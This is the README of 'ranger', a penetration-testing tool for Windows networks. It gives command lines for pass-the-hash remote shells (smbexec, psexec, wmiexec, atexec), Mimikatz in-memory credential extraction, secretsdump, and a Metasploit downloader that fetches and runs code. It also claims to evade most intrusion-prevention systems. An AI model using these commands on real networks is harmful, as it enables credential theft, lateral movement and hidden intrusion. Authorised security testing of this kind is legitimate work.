# ranger
A tool to support security professionals access and interact with remote Microsoft Windows based systems.

This project was conceptualized with the thought process, we did not invent the bow or the arrow, 
just a more efficient way of using it.

Ranger is a command-line driven attack and penetration testing tool, which as the ability to use 
an instantiated catapult server to deliver capabilities against Windows Systems.  As long as a user 
has a set of credentials or a hash set (NTLM, LM, LM:NTLM) he or she can gain access to systems that 
are apart of the trust.

Using this capability a security professional can extract credentials out of memory in clear-text, 
access SAM tables, run commands, execute PowerShell scripts, Windows Binaries, and other tools.  
At this time the tool bypasses the majority of IPS vendor solutions unless they have been custom 
tuned to detect it. The tool was developed using our home labs in an effort to support security 
professionals doing legally and/or contractually supported activities.

More functionality is being added, but at this time the tool uses the community contributions 
from repositories related to the PowerShell PowerView, PowerShell Mimikatz and Impacket teams.

##Command Execution:
###Find Logged In Users:
ranger.py [-u Administrator] [-p Password1] [-d Domain] --scout

###SMBEXEC Command Shell:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv

###PSEXEC Command Shell:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv

###PSEXEC Command Execution:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv

###WMIEXEC Command Execution:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"

###WMIEXEC PowerShell Mimikatz Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker

###WMIEXEC Metasploit web_downloader Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader

###WMIEXEC Custom Code Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"

###ATEXEC Command Execution:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder

###ATEXEC PowerShell Mimikatz Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder

###ATEXEC Metasploit web_downloader Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder

###ATEXEC Custom Code Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder

###SECRETSDUMP Custom Code Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump

###Create Pasteable Mimikatz Attack:
ranger.py --invoker -q -v -vv -vvv

###Create Pasteable web_downloader Attack:
ranger.py --downloader -q -v -vv -vvv

###Create Pasteable Executor Attack:
ranger.py --executor -q -v -vv -vvv

##Notes About Usage:
###Cred File Format:
* You can pass it a list of usernames and passwords or hashes in the following format in the same file:
```
username password
username LM:NTLM
username :NTLM
username **NO PASSWORD**:NTLM
PWDUMP
username PWDUMP domain
username password domain
username LM:NTLM domain
username :NTLM  domain
username **NO PASSWORD**:NTLM domain
PWDUMP domain
username PWDUMP domain
```

###Cred File Caveats:
* If you provide domain names in the file they will be used instead of the default WORKGROUP.  
* If you supply the domain name by command line (-d), it will infer that you want to ignore all the domain names in the file.

###Command Line Execution:
* If you do not want to use the file you can pass the details through command line directly.
* If you wish to supply hashes instead of passwords just pass them through the password argument.  
* If they are PWDUMP format and you supply no username it will pull the username out of the hash.  
* If you supply a username it will think that the same hash applies to a different user.
* Use the following formats for password:
```
password
LM:NTLM
:NTLM
PWDUMP
```

###Targets and Target Lists:
* You can provide a list of targets either by using a target list or through the target option.  
* You can supply multiple target list files by comma separating them and it will aggregate the data and remove duplicates and then exclude your IP address from the default interface or the interface you provide. 
* The tool accepts, CIDR notations, small ranges (192.168.195.1-100) or large ranges (192.168.194.1-192.163.1.1) or single IP addresses.  
* Again just comma separating them by command line or put them in a new line delimited file.

###Exclusions and Exclusion Lists:
* You can exclude targets using the exclude arguments as well, so if you do not touch a little Class C out of a Class A it will figure that out for you.

### Intrusion Protection Systems (IPS)
* Mimikatz, Downloader and Executor use PowerShell memory injection by calling other services and protocols.
* The commands are double encoded and bypass current IPS solutions (even next-gen) unless specifically tuned to catch these attacks.  
* ATEXEC is the only one that currently lands on disk and does not encode, I still have some rewriting to do still.

###NMAP
* The nmap XML feed is still in DRAFT and it is not functioning yet. 
